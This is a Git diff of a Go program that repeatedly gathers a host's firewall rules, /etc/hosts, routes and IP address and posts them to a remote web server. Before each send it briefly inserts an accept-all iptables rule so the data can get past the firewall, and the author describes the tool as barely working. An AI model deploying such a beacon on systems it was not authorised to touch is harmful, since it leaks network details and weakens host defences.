@@ -1,87 +1,96 @@
-// This go file will collect the host's firewall rules ship them back
-// to a defined webserver, along with the hostname
+// This go file will collect the host's firewall rules and other networking info, ship them back to a defined webserver,
+// along with the ip
 // disclaimer: this barely works
 // @author: degenerat3
 package main
 
-import "os/exec"
-import "fmt"
-import "log"
-import "net/http"
-// import "io/ioutil"
-import "bytes"
-import "encoding/json"
-import "strings"
-import "time"
-import "os"
+import (
+	"bytes"
+	"encoding/json"
+	"net"
+	"net/http"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
+)
 
-var serv = "127.0.0.1:5000"	//IP of flask serv
-var loop_time = 60		//sleep time in seconds
-
+var serv = "0.0.0.0:5000" //IP of flask serv
+var loopTime = 500        //sleep time in seconds
 
 // return output of "iptables -L" as one large string
-func get_tables() string{
-	cmd := exec.Command("/bin/bash", "-c", "echo \"Filter Table\"; iptables -t filter -L; echo; echo; echo \"NAT Table\"; iptables -t nat -L; echo; echo; echo \"Mangle Table\"; iptables -t mangle -L; echo; echo; echo \"Raw Table\"; iptables -t raw -L;")
-    out, err := cmd.CombinedOutput()
-    if err != nil {
-        log.Fatalf("cmd.Run() failed with %s\n", err)
+func getTables() string {
+	cmd := exec.Command("/bin/bash", "-c", "iptables-save")
+	out, err := cmd.CombinedOutput()
+	if err != nil {
 		return "Err"
-    }
+	}
 	return string(out)
 }
 
-
-// return hostname as string
-func get_hn() string{
-	cmd := exec.Command("hostname")
-    out, err := cmd.CombinedOutput()
-    if err != nil {
-        log.Fatalf("cmd.Run() failed with %s\n", err)
-        return "Err"
-    }
-	o1 := string(out)
-	o2 := strings.TrimSuffix(o1, "\n")
-    return o2
-
+// return output of "iptables -L" as one large string
+func getHosts() string {
+	cmd := exec.Command("/bin/bash", "-c", "cat /etc/hosts")
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return "Err"
+	}
+	return string(out)
 }
 
+// return output of "iptables -L" as one large string
+func getRoutes() string {
+	cmd := exec.Command("/bin/bash", "-c", "ip route")
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return "Err"
+	}
+	return string(out)
+}
+
+func getIP() string {
+	conn, _ := net.Dial("udp", "8.8.8.8:80")
+	defer conn.Close()
+	ad := conn.LocalAddr().(*net.UDPAddr)
+	ipStr := ad.IP.String()
+	ipStr = strings.Replace(ipStr, ".", "-", -1)
+	return ipStr
+}
 
 // post strings to flask server
-func send_data(rules string, host string){
-	url1 := "http://" + serv + "/api/rule_send"	// turn ip into valid url
-    jsonData := map[string]string{"hostname": host, "rules": rules}
+func sendData(rules string, hosts string, routes string, ip string) {
+	url1 := "http://" + serv + "/campfire" // turn ip into valid url
+	jsonData := map[string]string{"rules": rules, "etchosts": hosts, "routes": routes, "ip": ip}
 	jsonValue, _ := json.Marshal(jsonData)
+	insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT") //temporarily allow so we can send data
+	insRule.Run()
 	_, err := http.Post(url1, "application/json", bytes.NewBuffer(jsonValue))
+	dropRule := exec.Command("iptables", "-D", "FILTER", "1")
+	dropRule.Run()
 	if err != nil {
-		fmt.Printf("Req failed: %s\n", err)
-		return
-	} else{
-		// block below for debug
-		// data, _ := ioutil.ReadAll(resp.Body)
-		// fmt.Println(string(data))
 		return
 	}
+	return
 }
-
 
 // fetch data then send it
-func run(){
-	rules := get_tables()
-	host := get_hn()
-	send_data(rules, host)
+func run() {
+	rules := getTables()
+	hosts := getHosts()
+	routes := getRoutes()
+	ip := getIP()
+	sendData(rules, hosts, routes, ip)
 }
 
-func main(){
-	loop_arg := os.Args[1]
-	if loop_arg == "-s"{	// if "-s" is an arg, run once, otherwise loop
+func main() {
+	argLen := len(os.Args)
+	if argLen > 1 { // if there's an arg, only run once
 		run()
-	} else{
-		for {				// send data to webserver ever X seconds, until termination
+	} else {
+		for { // send data to webserver ever X seconds, until termination
 			run()
-			t := time.Duration(loop_time*1000)
+			t := time.Duration(loopTime * 1000)
 			time.Sleep(t * time.Millisecond)
 		}
 	}
 }
-
-
